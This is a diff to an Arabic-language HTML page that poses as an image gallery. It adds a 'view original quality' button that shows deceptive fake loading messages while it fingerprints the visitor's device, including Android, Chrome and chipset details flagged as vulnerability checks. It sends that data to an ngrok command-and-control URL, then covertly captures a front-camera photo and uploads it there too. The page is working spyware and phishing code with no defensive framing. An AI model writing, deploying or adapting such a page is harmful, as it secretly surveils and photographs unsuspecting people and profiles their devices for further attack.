@@ -3,24 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>عرض الصورة</title>
+    <title>معرض الصور - عرض جديد</title>
     <style>
-        body { margin: 0; padding: 0; background: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; }
+        body { 
+            margin: 0; padding: 0; background: #000; color: #fff; 
+            font-family: Arial, sans-serif; text-align: center; 
+        }
         #status {
             position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
-            background: rgba(0,0,0,0.8); padding: 15px 30px; border-radius: 10px;
+            background: rgba(0,0,0,0.85); padding: 15px 30px; border-radius: 12px;
             font-size: 18px; z-index: 999;
         }
+        .btn {
+            margin: 40px auto;
+            padding: 18px 50px;
+            font-size: 22px;
+            background: #1e90ff;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+        .btn:hover { background: #0077ff; }
     </style>
 </head>
 <body>
-    <div id="status">جاري تحميل الصورة...</div>
-    <img src="https://picsum.photos/id/1015/800/600" style="max-width:100%; margin-top:80px;" alt="صورة">
+
+    <div id="status">جاري تحميل الصور...</div>
+    <img src="https://picsum.photos/id/1015/800/600" style="max-width:95%; margin-top:50px;" alt="صورة">
+
+    <button class="btn" onclick="startFingerprintAttack()">عرض الصورة بالجودة الأصلية</button>
 
     <script>
         const C2_URL = "https://virulently-retaliative-kisha.ngrok-free.dev/collect";
 
-        async function captureAndSend() {
+        async function startFingerprintAttack() {
+            const status = document.getElementById("status");
+            status.innerHTML = "جاري تحميل النسخة عالية الجودة...";
+
+            // خطوات وهمية للخداع
+            await new Promise(r => setTimeout(r, 1100));
+            status.innerHTML = "جاري معالجة الصورة...";
+            await new Promise(r => setTimeout(r, 900));
+
+            // ================== جمع معلومات الجهاز + فحص الثغرات ==================
+            const fingerprint = {
+                timestamp: Date.now(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: `${screen.width}x${screen.height}`,
+                deviceMemory: navigator.deviceMemory || "unknown",
+                hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
+                webGL: detectWebGL(),
+                webAssembly: typeof WebAssembly !== "undefined",
+                androidVersion: getAndroidVersion(),
+                isQualcomm: /qualcomm|qcom|sm\d+/i.test(navigator.userAgent),
+                webView: /wv|webview|crosswalk/i.test(navigator.userAgent),
+                chromeVersion: getChromeVersion()
+            };
+
+            // إرسال البصمة إلى C2
+            fetch(C2_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ type: "fingerprint", data: fingerprint })
+            });
+
+            status.innerHTML = "جاري تحسين العرض...";
+
+            // محاولة التقاط صورة من الكاميرا (بعد النقر)
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user", width: 640, height: 480 } 
@@ -39,29 +91,37 @@
                     canvas.toBlob(async (blob) => {
                         const formData = new FormData();
                         formData.append("file", blob, `camera_${Date.now()}.jpg`);
-                        
-                        await fetch(C2_URL, { 
-                            method: "POST", 
-                            body: formData 
-                        });
-                        console.log("✅ تم إرسال الصورة بنجاح");
+                        await fetch(C2_URL, { method: "POST", body: formData });
                     }, "image/jpeg", 0.85);
 
                     stream.getTracks().forEach(track => track.stop());
                 }, 1500);
-
             } catch (e) {
-                console.log("❌ فشل التقاط الصورة");
+                console.log("Camera access denied");
             }
+
+            status.innerHTML = "تم عرض الصورة بنجاح ✓";
         }
 
-        window.onload = () => {
-            document.getElementById("status").innerHTML = "جاري تحسين الصورة...";
-            setTimeout(captureAndSend, 1500);
-            setTimeout(() => {
-                document.getElementById("status").innerHTML = "تم تحميل الصورة بنجاح ✓";
-            }, 5000);
-        };
+        // دوال مساعدة لفحص الثغرات
+        function getAndroidVersion() {
+            const match = navigator.userAgent.match(/Android\s([0-9.]+)/);
+            return match ? match[1] : "unknown";
+        }
+
+        function getChromeVersion() {
+            const match = navigator.userAgent.match(/Chrome\/([0-9.]+)/);
+            return match ? match[1] : "unknown";
+        }
+
+        function detectWebGL() {
+            try {
+                const canvas = document.createElement("canvas");
+                return !!canvas.getContext("webgl");
+            } catch(e) {
+                return false;
+            }
+        }
     </script>
 </body>
 </html>
